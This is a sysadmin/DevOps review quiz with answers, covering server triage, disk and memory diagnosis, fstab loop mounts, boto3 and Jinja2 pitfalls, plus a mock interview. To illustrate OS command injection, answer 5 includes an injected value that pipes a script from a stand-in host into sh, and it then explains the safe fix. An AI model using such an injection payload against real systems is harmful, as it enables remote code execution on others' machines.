# Day 20 — Quiz: Phase 0 Review + Mock Interview

Cross-cutting review questions spanning Days 1–19. Try to answer without looking at your notes — that's the entire point of a review day. Answers are at the bottom.

1. You SSH into a slow server. What's the very first command you run, and why does the number it returns mean nothing without a second piece of information?
2. `df -h` shows a filesystem at 100% full, but `du -sh` on that same filesystem only accounts for 60% of the reported space. What's the most likely explanation, and what command would confirm it?
3. In an `/etc/fstab` entry mounting a file-backed disk image (e.g., `disk.img`), what does the `loop` mount option do, and what error do you get if you forget it?
4. Name the three components of the USE method and give one concrete metric/tool for each, applied specifically to memory (not CPU).
5. A script contains `subprocess.run(f"ping -c 1 {host}", shell=True)`. What's wrong with this, and how would you fix it while still allowing real shell features if genuinely needed?
6. You need to list every EC2 instance tagged `Environment=prod` using boto3. What's the minimum IAM action the calling identity needs, and what does the boto3 call look like?
7. A YAML config defines a list of backend servers for a Jinja2 template to loop over, but the YAML author wrote it as a plain scalar string instead of a list. What actually happens when the Jinja2 `{% for %}` loop runs over it, and why is that worse than an outright error?
8. `ping <host>` succeeds instantly, but `curl -v <host>` to the same host hangs indefinitely. What does this combination of results tell you, and which network layers does each tool actually exercise?
9. `free -h` shows "available" memory near zero and heavy swap usage, while `top` shows low aggregate CPU usage (`us`+`sy`). What should you check next, and what's the likely bottleneck?
10. Why is deliberately writing a script "cold," without Googling, considered good interview and incident-response preparation, rather than just a memorization exercise?
11. **Interview question:** Our production server is responding slowly. You have SSH access. Go.

---

## Answers

1. **`uptime`** (or `w`). It returns the 1/5/15-minute load average, which is meaningless on its own — a load average of 8 is idle on a 32-core box and critical on a 2-core box. You always need `nproc` (or prior knowledge of the core count) alongside it to interpret whether the number represents saturation or headroom.

2. The most likely explanation is a **deleted-but-still-open file**: a process still holds a file descriptor open on a file that has been `rm`'d (commonly a huge log file). The kernel doesn't reclaim the disk space until the last open file descriptor referencing that inode is closed, so `df` (which reports actual block usage) shows the space as used while `du` (which walks the visible directory tree) can't find the file to count it, because it's no longer linked into any directory. Confirm with `lsof | grep deleted` (or `lsof +L1` for files with a link count of zero) to find the process still holding it open; the fix is restarting/signaling that process, or truncating in place (`> file`) instead of deleting log files that are actively being written.

3. The `loop` option tells the kernel to mount the target as a **loopback device** — i.e., treat a regular file as if it were a block device by wrapping it through `/dev/loopN`. Without it, `mount` (or `mount -a` processing that `fstab` line) tries to treat the file path itself as a special device node and fails with something like `mount: <mountpoint>: special device <path> does not exist`, because a plain file isn't a block device the kernel can mount directly.

4. **Utilization** — how busy the resource is, e.g. `free -h`'s used-vs-total memory. **Saturation** — how much extra work is queued/waiting beyond what the resource can currently handle, e.g. active swap activity (`vmstat`'s non-zero, sustained `si`/`so` columns) indicating memory demand has exceeded physical RAM. **Errors** — error events for that resource, e.g. OOM-killer invocations visible via `dmesg | grep -i oom` or `journalctl -k`.

5. `shell=True` passes the string to `/bin/sh -c`, so if `host` comes from user input, an API response, or an untrusted config, every shell metacharacter (`;`, `|`, `&&`, backticks, `$()`) is live — classic OS command injection (CWE-78): `host = "example.com; curl evil.sh | sh"` runs the attacker's payload. Fix: default to `shell=False` with a list of arguments (`subprocess.run(["ping", "-c", "1", host])`), which passes `host` as one literal argument no matter its contents — immune to injection by construction, not by escaping. If real shell features (pipes, globbing) are genuinely required, use `shlex.split()` to build a safe argument list without a shell, or `shlex.quote()` to escape a value if `shell=True` truly can't be avoided.

6. **`ec2:DescribeInstances`** — EC2's read APIs use "Describe" rather than "List" for this kind of query, and it also serves as the filtering/listing call. Boto3: `boto3.client("ec2").describe_instances(Filters=[{"Name": "tag:Environment", "Values": ["prod"]}, {"Name": "instance-state-name", "Values": ["running"]}])`.

7. In Python (and Jinja2, which uses Python's iteration protocol), a **string is iterable** — iterating over it yields one character at a time. So `{% for server in servers %}` where `servers` was meant to be a list but got parsed as the scalar string `"10.0.0.1, 10.0.0.2"` will silently loop once per *character* of that string instead of once per server, producing garbage output (or a config referencing single characters as hostnames) with **no error at all**. This is worse than a crash because it fails silently — the template renders "successfully" and produces a broken config that may not be noticed until something downstream fails mysteriously. The actual YAML bug is almost always a missing `-` list-item dash, collapsing what was meant to be a block sequence into a plain scalar.

8. `ping` only exercises **ICMP at Layer 3** (network layer) — it confirms the host is reachable and responds to echo requests, nothing more. `curl -v` exercises the full stack up through **Layer 7 (HTTP)**: TCP connection establishment, optionally TLS handshake, sending the request, and waiting for a response. A host that responds to `ping` but hangs on `curl` tells you the network path itself is fine (routing, basic reachability) but something at the TCP/application layer is broken — commonly the target process isn't accepting connections on that port, a firewall/security group allows ICMP but blocks the specific TCP port, or the application accepted the connection but is hung and never sends a response.

9. Check **swap activity specifically** with `vmstat 1 5` (sustained non-zero `si`/`so`) and the process list sorted by memory (`ps --sort=-pmem`). The likely bottleneck is **memory-driven disk I/O**: something has exhausted available RAM, the kernel is swapping heavily, and swapping is itself disk I/O — which is why CPU usage looks low (the CPU is mostly idle/waiting, shown as high `wa` in `top`) even though the system feels sluggish. Low CPU with high load and heavy swap is the classic memory-exhaustion-causing-I/O-saturation pattern, not a compute problem.

10. Recognizing a correct solution when you read it (recognition) and producing it unaided (recall) are different cognitive skills, and interviews and incidents both test recall specifically, under worse conditions than casual practice (a live interviewer, or a production outage with no time to browse). Practicing cold, timed, without a search engine is the only realistic simulation of those conditions — it surfaces exactly which gaps will actually bite you live, rather than gaps that only exist in a false sense of "I'd remember it if I needed to."

11. Strong answer structure (see [02-README-Mock-Interview-Playbook.md](02-README-Mock-Interview-Playbook.md) for the full worked walkthrough): first ask clarifying questions (scope — one server or several; recent changes/deploys; what "slow" concretely means). State the plan out loud: broad-to-narrow — load average and core count, then CPU, then memory, then disk, then network, then application logs. Narrate each command and its result before moving to the next. A strong path finds high load average with *low* CPU usage and high `wa` (I/O wait), checks memory next (`free -h`/`vmstat`) and finds available memory near zero with active swap thrashing, correlates the responsible process's memory growth with a recent deploy via `ps`/`journalctl`, and closes with both an immediate fix (restart the leaking process/service, ideally after pulling the node from rotation) and a longer-term fix (flag the deploy, get the leak fixed in code, add a memory-usage alert so it's caught in minutes instead of via a user complaint).
